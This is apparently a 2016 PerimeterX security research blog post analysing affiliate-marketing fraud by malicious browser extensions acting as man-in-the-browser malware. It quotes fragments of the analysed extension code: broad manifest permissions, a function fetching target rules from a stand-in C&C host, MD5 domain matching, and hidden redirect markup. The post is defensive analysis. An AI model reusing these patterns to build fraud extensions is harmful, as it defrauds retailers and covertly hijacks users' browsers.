---
template: "blog/blog-post"
draft: false

# Metadata
title: "Affiliate Marketing Fraud by Man in the Browser Attacks"
description: "Learn how affiliate marketing fraud bots are attacking websites with browser extension malware.  PerimeterX outlines the issue and how to stop it!"

# Breadcrumbs
breadcrumbs:
  - name: Home
    path: /
  - name: Blog
    path: /blog/1/
  - name: Affiliate Marketing Fraud...

# Fields
date: 2016-07-05
author:
  - Ido Safruti

blog_title: "Hijacking a User’s Shadow: Affiliate Fraud via Malicious Extensions"
categories: Research
tags:
  - fraud
  - affiliate fraud
  - malicious extensions

thumbnail: hijacking-a-users-shadow.jpg

canonical_overwrite: https://www.infoworld.com/article/3099847/security/3-ways-websites-get-pwned-and-threaten-you.html
---

[As referenced by InfoWorld](https://www.infoworld.com/article/3099847/security/3-ways-websites-get-pwned-and-threaten-you.html)

In the last few weeks, we have encountered a widespread [affiliate marketing](https://en.wikipedia.org/wiki/Affiliate_marketing) fraud attack based on a network of browser extension malware. This centrally controlled bot net is targeting thousands of web sites, including 105 of the top 120 internet retailers (according to IR500) and 71 of the [Alexa top 500 sites](http://www.alexa.com/topsites). The malicious extension "hijacks" legitimate users and tags them
to collect affiliate and referral fees. We are aware of a sites paying thousands of dollars to fictitious affiliates due to this attack, so one can only assume the scale and overall sums collected by this highly organized crime network.

![digital_footprint](/assets/images/blog/digital_footprint.jpg "Digital Footprint")

Companies want to get more users on their sites, whether they are ecommerce sites trying to sell more or media sites wanting to expand their reach. One way of accomplishing this goal is through affiliate marketing, where a third party site will drive users to perform specific actions on the site (purchase, view, or other) and will be paid for their referral via an affiliate agreement. An affiliate program may pay out to the referring site as much as 30% of what the visitor spends on its website, these payments can add up to meaningful amounts, making it an attractive target for fraud.

The attack we have encountered is highly sophisticated — it utilizes real users’ web browsers in what is called a [Man in the Browser](https://en.wikipedia.org/wiki/Man-in-the-browser) attack. It does this by installing and distributing “malware” in the form of a browser extension on an actual user's device. Once installed, the software can inspect the user’s activity and operate on the user’s behalf without the user’s knowledge (clicking and opening different sites in hidden iframes, for instance). Running from within the browser while the true user is active makes it extremely hard to detect the malicious activity or distinguish between the user’s activities and those of the malware.

This specific browser extension performs targeted affiliate fraud by falsely associating all of the user's activities and eventual purchases on a website to an affiliate that never actually referred the user. Running quietly in the background, this extension watches every site with which the user interacts, checks a database of thousands of sites to see if the currently viewed site is being targeted, and then applies a method of fraudulently associating a referral ID to the user's session that is accepted by the site.

In this way, money is drained from the affiliate program budget for each of the targeted websites, and the analytics of the effectiveness of the marketing spend are skewed, losing track of the actual contributors.

## Passively Hijacking Your Shadow: Opportunist Affiliate Tagging 

### Installing and distributing the malware

Users don’t install malware on purpose. These malicious browser extensions appear legitimate at first glance. They are highly rated in their browser's “extension stores” and in many cases perform real functions (either by duplicating some legitimate extension or by actually providing such a capability). For example, one extension downloads videos from popular media sites; another adds useful features to Facebook Messenger or an extension that promises it will let you know who is watching your Facebook profile.

Once the extension is installed, it will not act immediately to avoid unneeded attention from monitoring tools. It will typically wait for a period of time, usually one or two weeks, and only then will it contact the control center and download a payload in the background. Some of these extensions will also up-vote themselves on the extension stores, and they even will write automated, positive reviews. This will help the extension get broader distribution.

### Analysis of the attack

The initial payload that is downloaded by the extension contains a hashed list of more than 50,000 websites and instructions on how to communicate with a command and control server (C&C). With the list of sites in hand, the extension quietly sits on the user's device, watching every website that is visited. When the user visits a website from the list, the extension will report to the C&C and get further instructions.

Typically, the instructions will be to mark the user as referred by a specific affiliate by manipulating the referrer ID in the request parameter or by modifying the cookies of that site to store the required affiliate ID instead of the current value it had.

![fraud_example](/assets/images/blog/affiliate-fraud-example.jpg "An example of hijacked user affiliation")

This will result in the site attributing any following activity of the user to the specific affiliate and paying referral fees to the affiliate for every transaction the user ends up making.

Note that the users are legitimate, and so are all of their actions (for instance, purchasing a specific item). The problem is that the site now falsely attributes this activity to an affiliate that, in fact, isn't contributing a thing. The outcome of such fraud could be:

- paying attribution fees of thousands of dollars to an affiliate that didn’t contribute a single user;
- ruining potential successful affiliate relations, as they will be underpaid (attributing their activities to the fraudulent one); or
- skewing the analytics of affiliate channels, crippling their ability to properly assess successful contributions and spending on affiliate channels and damaging the ability to invest in channels that lead to growth.

This is an extremely smart and flexible platform for the creator of the extension. It is able to monetize directly by collecting affiliate payouts or by selling the access to specific affiliates, thereby adding another layer to mask its true identity.

Remember, all of this activity is happening behind the scenes in hidden sessions that are completely in parallel to the user’s natural browser activity, in their shadow. As these extensions piggyback on legitimate users’ transactions, they benefit from the appearance and behavior of a real human. The extension creators know that the website will not want to block a user from performing a legitimate transaction.

The users’ transactions are real and valuable to the site, so one should NOT block the users infected with this affiliate fraud. The proper response is to detect the fraudulent affiliate tagging and to block payments for these affiliates as well as remove the contribution of these affiliates from the analytics to avoid the skew in data.

## The attack, in detail

Now we will dive into the technical details. It all starts with the extension being installed. A common thing for such an extension is to request excessive permissions that, in general, aren’t justified:

![extension_install](/assets/images/blog/extension_install.png)

While being installed, the extension requests access to read and change ALL of the data on ANY website the user visits.  What does that really mean? Allowing this level of access means the extension can intercept every web site the user browses and manipulate the requests in any way it wants. In other words, allowing access gives the extension full control over the user’s browsing experience. This is how the manifest.json  file of this extension looks like:

```json
"permissions":["*://*/*","webRequest","webRequestBlocking","tabs","storage"],
```

Once the extension is installed, it will do several things to help protect itself from being detected. The extension will first wait for a period of a week or two before doing any malicious activity, to hide its true nature from anyone monitoring its activity. Only after that waiting period, it will contact its command and control server (C&C) and download a large payload file that includes a list of target domains it wants to defraud. We’ve also noticed some less sophisticated extensions that go for the kill rather quickly, skipping this safety step.

```javascript
function updateRules() {
  var currentTimestamp = Math.floor(Date.now() / 1000);
  if (
    typeof localStorage["rules"] === "undefined" ||
    typeof localStorage["rules_timestamp"] === "undefined" ||
    currentTimestamp - localStorage["rules_timestamp"] > 60 * 60 * 24
  ) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://example.ru/get_rules.php", true);
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4) {
        localStorage["rules"] = xhr.responseText;
        localStorage["rules_timestamp"] = currentTimestamp;
      }
    };
    xhr.send();
  }
}
```

Some of the extensions go to greater lengths to hide this domain list by fetching a resource file of salted MD5 hashes that represent the target domain. These hashes are the keys to the websites the extension is targeting. On every URL visited, the extension will take the root domain, MD5 hash it, and compare the hash to the list. The extension has its own MD5 functions included in the source code.

```javascript
a = function(e) {
  var r = /^.*:\/\/(?:[wW]{3}\.)?([^:/]*).*$/,
    n = r.exec(e)[1],
    t = MD5(n),
    o = document.getElementById(t);
};
```

If the website is in the target list, the extension will contact the C&C and will get a specific offer for the website. The most common instructions are for the browser to follow a series of redirects through an affiliate partner network. As the browser loads these URLs in the background, it eventually lands at the target website with the necessary information required to tag the user. This can include the affiliate ID, click ID, click timestamp, and partner ID. Since this is set on the targeted domain, the user’s entire activity will be attributed to that affiliate. This means that on any purchase the user makes, this fraudulent affiliate will receive a referral fee, even though the user got to the page on his own or due to some other affiliate's advertisement.

```javascript
Request URL:https://example.com/?action=ffer2&addon=downloadbutton&addon_version=2.0&browser=chrome&browser_version=53.0.2773.0&locale=en_US&ef_version=2&modules[]=ffer&_=1466670245658&url=http://www.example_store.com/
```

Which leads to the browser loading a redirect in the hidden view to the targeted website.

```html
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <title></title>
    <meta http-equiv="refresh"
    content="0;URL='http://r.srvtrck.com/v1/redirect?type=linkId&id=xxxxxxxxxxx&api_key=xxxxxxxxxxx&site_id=xxxxxxxxxxx&dch=feed&ad_t=advertiser&yk_tag=2"'"
    />
  </head>
  <body></body>
</html>
```

The largest domain list we’ve seen contained more than 66,000 entries, with approximately 18,212 in the Alexa Top 1M websites list. 71 of the Alexa Top 500 list are actively being defrauded.

The C&C can also decide to not send any command for the site. This helps in managing inventory and in rationing exposure so that the malicious activity will not catch the attention of the site owner.
